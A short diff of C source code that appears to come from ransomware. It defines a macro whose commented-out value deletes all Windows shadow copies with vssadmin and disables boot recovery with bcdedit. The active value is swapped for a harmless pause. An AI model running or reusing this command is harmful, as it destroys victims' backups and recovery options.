@@ -1,4 +1,7 @@
+#include <windows.h>
+
 #include "util.h"
+#include "crypt.h"
 
 //#define RM_SHADOW_BACKUPS "/c vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures"
 #define RM_SHADOW_BACKUPS	"/c pause"
